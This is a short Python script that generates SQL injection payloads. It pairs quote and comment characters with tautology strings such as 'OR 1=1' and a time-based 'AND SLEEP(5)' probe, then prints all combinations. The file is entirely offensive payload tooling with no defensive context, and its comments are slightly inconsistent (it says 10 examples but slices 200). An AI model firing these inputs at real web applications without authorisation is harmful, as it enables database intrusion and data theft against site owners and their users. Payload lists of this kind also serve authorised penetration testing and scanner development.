import itertools

# Define some common SQL injection characters
chars = ["'", "\"", "--", "#", "/*", "*/"]

# Define some basic SQL injection payloads
payloads = [
    "{} OR 1=1{}",
    "{} OR 'a'='a'{}",
    "{} OR 1=1'{}",
    "{} AND SLEEP(5)",
]

# Generate combinations of characters and payloads
generated_payloads = []
for payload in payloads:
    for char1, char2 in itertools.product(chars, repeat=2):
        generated_payloads.append(payload.format(char1, char2))

for payload in generated_payloads:
    print(payload)

# Limit the output to just 10 examples
#limited_payloads = generated_payloads[:200]
#for i, payload in enumerate(limited_payloads):
    #print(f"{i+1}: {payload}")